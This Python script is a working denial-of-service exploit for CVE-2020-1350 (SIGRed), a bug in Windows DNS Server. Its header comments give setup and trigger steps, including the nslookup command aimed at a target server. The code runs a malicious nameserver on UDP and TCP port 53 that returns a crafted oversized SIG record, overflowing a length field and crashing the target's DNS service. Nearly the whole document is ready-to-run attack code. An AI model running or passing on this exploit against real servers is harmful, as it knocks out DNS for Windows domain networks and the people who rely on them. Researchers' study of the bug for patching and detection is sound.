# CVE-2020-1350 (SIGRed)
# Windows DNS DoS Exploit
#
# Credits for the bug are entirely down to Check Point Research (@_cpresearch_) who did an incredible writeup of this bug (props to @sagitz_ for the post)
# Their writeup can be found at https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/
#
#
# This exploit was written by @maxpl0it
#
# Quick summary of how it works:
#   1) On the LAN you trigger a DNS request (more specifically, a request for the SIG records) for an evil domain (for example 9.evil_domain.com)
#   2) This gets sent to the vulnerable Windows server's DNS server
#   3) The vulnerable server sends a request to whatever DNS it forwards requests to (usually the standard Google IPs)
#   4) The Google DNS responds with the nameservers for the evil domain
#   5) The vulnerable server then acts as a DNS client and sends a request to the evil DNS server
#   6) The evil server responds with a payload that overflows a 2-byte number, causing a smaller allocation to take place than is required
#   7) The signature is copied over and things break (of course), crashing the vulnerable server's DNS server
#
#
# General Setup:
# --------------
# This exploit requires you to set up a domain with its own nameservers pointing to your server.
#
# Set up the server and run this script. It will listen on port 53 on both TCP and UDP
# If you get an error saying that the ports are busy, use netstat -pa to figure out what's listening on the domain ports
# (probably systemd-resolved) and disable + stop it. If nothing's listening on the server, make sure you killed all instances of
# this script before re-running.
#
# For example, I ran `python sigred_dos.py ibrokethe.net` to start the malicious DNS server
#
#
# Execution:
# ----------
# In order to trigger the vulnerability on the Windows DNS server, run `nslookup -type=sig 9.your_domain_name_here dns_server_to_target`
# For example, I ran `nslookup -type=sig 9.ibrokethe.net 127.0.0.1` as I was running this on the server.



import socket
import sys
import threading
import struct

domain = None
domain_compressed = None


def setup():
	global domain_compressed
	# Setup
	domain_split = [chr(len(i)) + i for i in domain.split(".")]
	domain_compressed = "".join(domain_split) + "\x00"



# The TCP port is contacted second
def tcp_server():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(('0.0.0.0', 53))
	sock.listen(50)
	response = ""
	while True:
		try:
			connection, client_address = sock.accept()
			print("Received TCP Connection")
			data = ""

			# SIG Contents
			sig = "\x00\x01" # Type covered
			sig += "\x05" # Algorithm - RSA/SHA1
			sig += "\x00" # Labels
			sig += "\x00\x00\x00\x20" # TTL
			sig += "\x68\x76\xa2\x1f" # Signature Expiration
			sig += "\x5d\x2c\xca\x1f" # Signature Inception
			sig += "\x9e\x04" # Key Tag
			sig += "\xc0\x0d" # Signers Name - Points to the '9' in 9.domain.
			sig += ("\x00"*(19 - len(domain)) + ("\x0f" + "\xff"*15)*5).ljust(65465 - len(domain_compressed), "\x00") # Signature - Here be overflows!

			# SIG Header
			hdr = "\xc0\x0c" # Points to "9.domain"
			hdr += "\x00\x18" # Type: SIG
			hdr += "\x00\x01" # Class: IN
			hdr += "\x00\x00\x00\x20" # TTL
			hdr += struct.pack('>H', len(sig)) # Data Length

			# DNS Header
			response = "\x81\xa0" # Flags: Response + Truncated + Recursion Desired + Recursion Available
			response += "\x00\x01" # Questions
			response += "\x00\x01" # Answer RRs
			response += "\x00\x00" # Authority RRs
			response += "\x00\x00" # Additional RRs
			response += "\x019" + domain_compressed # Name (9.domain)
			response += "\x00\x18" # Type: SIG
			response += "\x00\x01" # Class: IN
			try:
				data += connection.recv(65535)
			except:
				pass
			len_msg = len(response + hdr + sig) + 2 # +2 for the transaction ID
			# Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)
			connection.sendall(struct.pack('>H', len_msg) + data[2:4] + response + hdr + sig)
			connection.close()
		except:
			pass


# The UDP server is contacted first
def udp_server():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	server_address = '0.0.0.0'
	server_port = 53
	response = "\x83\x80" # Flags: Response + Truncated + Recursion Desired + Recursion Available
	response += "\x00\x01" # Questions
	response += "\x00\x00" # Answer RRs
	response += "\x00\x01" # Authority RRs
	response += "\x00\x00" # Additional RRs

	# Queries
	response += "\x019" + domain_compressed # Name
	response += "\x00\x18" # Type: SIG
	response += "\x00\x01" # Class: IN

	# Data
	data = "\x03ns1\xc0\x0c" # ns1 + pointer to 4.ibrokethe.net
	data += "\x03ms1\xc0\x0c" # ms1 + pointer to 4.ibrokethe.net
	data += "\x0b\xff\xb4\x5f" # Serial Number
	data += "\x00\x00\x0e\x10" # Refresh Interval
	data += "\x00\x00\x2a\x30" # Response Interval
	data += "\x00\x01\x51\x80" # Expiration Limit
	data += "\x00\x00\x00\x20" # Minimum TTL

	# Authoritative Nameservers
	response += "\xc0\x0c" # Compressed pointer to "4.ibrokethe.net"
	response += "\x00\x06" # Type: SOA
	response += "\x00\x01" # Class: IN
	response += "\x00\x00\x00\x20" # TTL
	response += struct.pack('>H', len(data)) # Data Length

	sock.bind((server_address, server_port))
	while True:
		try:
			recvd, client_address = sock.recvfrom(65535)
			print("Received UDP connection")
			if len(recvd) > 2:
				sent = sock.sendto(recvd[:2] + response + data, client_address)
		except:
			pass



if __name__ == "__main__":
	if len(sys.argv) != 2:
		print("python sigred_dos.py evil_domain") # For example, I ran python `sigred_dos.py ibrokethe.net`
		exit()
	
	# Domain name must be *a maximum* of 19 characters in length
	domain = sys.argv[1]
	if len(domain) > 19:
		print("Domain length must be less than 20 characters")
	
	setup()

	# Sets up two servers: one on UDP port 53 and one on TCP port 53
	first = threading.Thread(target=udp_server)
	second = threading.Thread(target=tcp_server)

	first.start()
	second.start()

	first.join()
	second.join()
